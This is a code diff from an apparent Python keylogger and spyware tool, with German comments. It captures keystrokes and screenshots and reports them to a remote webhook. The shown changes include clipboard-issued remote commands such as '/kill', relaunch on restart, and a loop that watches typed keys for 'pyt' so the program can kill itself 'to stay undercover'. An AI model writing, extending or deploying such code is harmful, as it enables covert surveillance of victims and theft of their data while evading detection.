@@ -137,7 +137,7 @@ def on_release(key):
             except:
                 send_to_webhook("Faild to make folder visable.")
             return False
-        
+
         elif "/kill" in current_clipboard:
             send_to_webhook(f"Kill command executed by: {username}")
             send_to_webhook("Launching again on restart.")
@@ -240,13 +240,11 @@ def screenshot():
         time.sleep(5)  # Wartezeit vor dem nächsten Screenshot
 
 def monitor_input():
-    time.sleep(1)
-    if "pyt" in keystrokes:
-        send_to_webhook("User searched for Python killed the process to stay undercover.")
-        return False
-    elif "Pyt" in keystrokes:
-        send_to_webhook("User searched for Python killed the process to stay undercover.")
-        return False
+    while True:
+        time.sleep(1)  # Warte 1 Sekunde zwischen den Checks
+        with lock:
+            if "pyt" in keystrokes.lower():
+                send_to_webhook("User searched for Python. Killing process to stay undercover.")
 
 
 # Run kill.bat file at the start
